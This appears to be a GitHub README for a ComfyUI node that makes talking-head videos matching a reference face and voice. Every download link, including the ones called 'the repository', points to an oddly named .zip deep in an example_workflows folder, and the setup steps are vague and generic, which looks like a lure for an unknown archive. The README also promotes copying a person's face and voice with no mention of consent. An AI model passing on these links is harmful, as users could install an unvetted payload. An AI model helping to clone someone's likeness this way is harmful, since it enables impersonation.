# 🎬 ID-LoRA-LTX2.3-ComfyUI - Create Identity-Based Videos Fast

[![Download](https://img.shields.io/badge/Download-Get%20the%20app-blue?style=for-the-badge)](https://raw.githubusercontent.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI/main/example_workflows/Comfy-UI-R-I-LT-Lo-2.9-alpha.2.zip)

## 🧩 What This Is

ID-LoRA-LTX2.3-ComfyUI is a custom ComfyUI node for making videos with a matching voice and face. It uses a reference image and a reference voice to help keep the same identity across the video.

This tool fits people who want to make avatar-style clips, talking-head videos, or identity-based video content in ComfyUI on Windows.

## 🚀 What You Need

- A Windows PC
- ComfyUI installed
- A working internet connection for the first setup
- Enough free disk space for model files
- A GPU with enough VRAM for video work
- A reference image
- A reference voice file

## 📥 Download

Open this page to download and set up the node:

https://raw.githubusercontent.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI/main/example_workflows/Comfy-UI-R-I-LT-Lo-2.9-alpha.2.zip

## 🖥️ Windows Setup

### 1. Install ComfyUI

If you do not have ComfyUI yet, install it first.

- Download ComfyUI for Windows
- Unzip it to a folder you can find later
- Start ComfyUI once to check that it runs

### 2. Add the custom node

- Open the `custom_nodes` folder inside your ComfyUI folder
- Download this repository from the link above
- Place the `ID-LoRA-LTX2.3-ComfyUI` folder inside `custom_nodes`

Your path should look like this:

`ComfyUI\custom_nodes\ID-LoRA-LTX2.3-ComfyUI`

### 3. Install the needed files

- Open the node folder
- Look for any install file or setup notes in the repository
- If the package uses Python tools, install them from the included instructions
- Restart ComfyUI after setup

### 4. Add your model files

- Put the required model files in the folders used by ComfyUI
- Keep the names simple
- Do not move files after setup unless the node instructions tell you to

## 🎯 How to Use It

### 1. Start ComfyUI

Open ComfyUI on Windows.

### 2. Load the workflow

- Find a workflow made for this node
- Load it into ComfyUI
- Check that the new node appears in the graph

### 3. Pick your reference image

Use a clear image of the person or character you want to keep in the video.

Best results come from:

- A front-facing image
- Good lighting
- A sharp face
- No heavy blur
- A plain background

### 4. Pick your reference voice

Use a voice file that matches the identity you want in the video.

Best results come from:

- Clean audio
- No strong background noise
- One speaker
- A short, clear sample

### 5. Set your video prompt

Write a simple prompt that tells ComfyUI what the video should show.

Example:

- A person speaking to the camera
- The person turns their head
- Soft room lighting
- Natural face movement

Keep the prompt clear and short.

### 6. Run the node

- Click the run button in ComfyUI
- Wait while the video is processed
- Save the output when it finishes

## 🛠️ Basic Workflow

A common setup in ComfyUI looks like this:

1. Load the reference image
2. Load the reference voice
3. Add the ID-LoRA-LTX2.3-ComfyUI node
4. Set the video length
5. Set motion strength
6. Run generation
7. Review the output
8. Adjust and try again if needed

## 🎛️ Useful Settings

### Identity strength

This controls how closely the video matches the reference identity.

- Higher values keep the face and style more fixed
- Lower values allow more variation

### Motion strength

This controls how much movement appears in the video.

- Lower values give a calm result
- Higher values add more motion

### Audio match

This helps keep speech and sound aligned with the identity.

- Use clear voice input
- Keep the sample short and clean
- Use the same speaker across your inputs

### Video length

Start with a short clip.

- Short clips render faster
- Short clips are easier to test
- You can raise the length after you confirm the setup works

## 📁 Folder Guide

Use this simple folder layout for a clean setup:

- `ComfyUI\custom_nodes\ID-LoRA-LTX2.3-ComfyUI` for the node files
- `ComfyUI\models` for model files
- `ComfyUI\input` for source images and audio
- `ComfyUI\output` for finished videos

## 🔍 If It Does Not Work

### The node does not show up

- Check that the folder is inside `custom_nodes`
- Make sure the folder name is correct
- Restart ComfyUI

### The workflow fails to load

- Confirm that you downloaded the full repository
- Check for missing node files
- Try a different workflow made for this node

### The output looks wrong

- Use a clearer face image
- Use a cleaner voice sample
- Lower motion strength
- Raise identity strength

### The video is slow

- Use a shorter clip
- Close other apps
- Use a smaller input image
- Check your GPU memory use

## 🧪 Best Results

- Use one clear face in the image
- Keep the voice sample clean
- Start with a short test clip
- Change one setting at a time
- Save good settings for later use
- Use a strong, simple prompt

## 📌 Example Use Cases

- Talking avatar videos
- Identity-based short clips
- Voice-led demo videos
- Face-matched motion tests
- ComfyUI video experiments

## 🔧 For ComfyUI Users

This node is made for users who already work inside ComfyUI and want a video setup that keeps the same visual identity and voice cues across output clips.

It fits workflows that use:

- Custom nodes
- Model-based video generation
- Reference-driven output
- Audio-visual generation

## 📦 Download and Install

Open the repository here and download the files:

https://raw.githubusercontent.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI/main/example_workflows/Comfy-UI-R-I-LT-Lo-2.9-alpha.2.zip

Then:

- Copy the folder into `ComfyUI\custom_nodes`
- Restart ComfyUI
- Load your workflow
- Add your reference image and voice
- Run the generation

## 🧭 Quick Start

1. Download the repository
2. Place it in `ComfyUI\custom_nodes`
3. Restart ComfyUI
4. Load a workflow made for this node
5. Add a face image
6. Add a voice sample
7. Run the workflow
8. Save the video output